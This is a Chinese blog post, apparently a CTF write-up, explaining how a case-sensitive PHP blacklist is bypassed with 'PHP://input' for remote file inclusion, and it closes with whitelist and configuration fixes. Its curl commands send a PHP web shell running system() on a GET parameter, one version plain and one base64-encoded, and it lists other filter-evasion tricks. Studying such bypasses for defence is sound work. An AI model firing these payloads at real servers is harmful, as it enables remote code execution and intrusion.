---
layout: post
title: PHP:// 为什么能过：两层对同一个字符串的理解不同
summary: 黑名单按字面匹配，PHP 按协议解析。大小写正好在两者之间裂开一条缝。
tags: 过滤器 协议 大小写
date: 2026-10-18 11:05:00 +0800
---

一道题，参数叫 `url`，`allow_url_include` 是开的，能远程包含。黑名单写得很长：`data`、`http`、`log`、`access`、`pear`、`tmp`、`zlib`、`filter`、`php`、`:` 全在里面。

按字面看，`php://` 死透了。

但它过了。

## 同一个字符串，两层两种读法

PHP 判断一个路径是协议还是文件名，看 `://` 前面那段是不是已注册的 wrapper。这个匹配不区分大小写 —— `PHP://`、`Php://`、`pHp://` 都会被当成 php wrapper。

黑名单匹配的是字符串。如果它写成 `preg_match('/php/i')` 或者先 `strtolower` 再比，那确实拦得住；但常见的写法是 `preg_match('/php/')` 或者 `strpos($s,'php')!==false`，这俩都区分大小写。

于是：

```
输入:        PHP://input
PHP 看到的:   协议 php，标准输入流
黑名单看到的: 大写 PHP，找不到小写 php，放行
```

一行就能试出来：

```bash
curl -s -G --data-urlencode "url=PHP://input" --data '<?php echo 42;?>' "$URL"
```

回 `42`，说明黑名单没折叠大小写。回"禁止访问"就说明带了 `i`，得换别的层再试。

## 同一道题里的第二个陷阱

`data://` 被禁，`php://filter` 也被禁 —— 因为 `filter` 在表里。

那 `PHP://input` 为什么能过？`input` 不在表里。列黑名单的人想到了 `filter`，没想到 `input`。黑名单是按**词**列的，而 `php://` 的用法是按**功能**分的，两者对不上。

所以真正穿过去的是两件事叠在一起：大小写绕开了协议名，换个用法绕开了功能名。

## 完整请求

`php://input` 读的是请求体，所以用 POST：

```bash
curl -s -X POST \
  --data-urlencode "url=PHP://input" \
  --data '<?php system($_GET[c]);?>' \
  "$URL&c=id"
```

如果还担心请求体被关键字扫，就让请求体看不出是 PHP —— 先编码，再用 wrapper 解一次：

```bash
curl -s -X POST \
  --data-urlencode "url=PHP://filter/read=convert.base64-decode/resource=PHP://input" \
  --data 'PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOz8+' \
  "$URL&c=id"
```

这样请求体里没有 `<?php`、没有等号、没有引号。至于 `filter` 这个词在 URL 里能不能过，就看黑名单到底按什么匹配了。

## 这类绕过的共同点

它不是"猜中了黑名单"，而是**两层用不同的规则去理解同一份输入**：

| 层 | 判断依据 | 结果 |
|---|---|---|
| 过滤器 | 字符串里有没有某些子串（区分大小写） | 放行 |
| PHP 运行时 | 前缀是不是已注册协议（不区分大小写） | 当 php wrapper 执行 |

只要两层的规则不完全一致，就有穿过去的写法。同一类的还有：

- 过滤器只看 `$_GET`，应用实际读 `$_REQUEST`（POST、Cookie 也能进）；
- 过滤器检查解码前的串，运行时用的是解码后的（`%70hp://`）；
- 过滤器检查整条 URL，运行时只看 `?` 后面那截。

## 修法

白名单，别用黑名单。要允许伪协议，就写成"只允许这几个前缀"：

```php
$allowed = ['/var/www/uploads/', '/data/cache/'];
$real = realpath($path);
foreach ($allowed as $dir) {
    if ($real !== false && str_starts_with($real, $dir)) { /* 放行 */ }
}
```

如果要按协议判断，就自己解析并规整大小写再比：

```php
$scheme = strtolower((string) parse_url($path, PHP_URL_SCHEME));
if ($scheme !== '') { /* 有协议就一律拒绝 */ }
```

最省事的还是把口子堵在源头上：`allow_url_include=Off`，需要包含的文件用固定映射（`id=1 => /data/tpl/1.php`），根本不给参数传路径的机会。

## 小结

`PHP://` 能过，不是因为黑名单写得少，而是因为过滤器拿字符串规则去判断一个由协议解析器理解的输入。写检测的时候多问一句"它和我看的是同一层吗"，往往比再试十个 payload 有用。
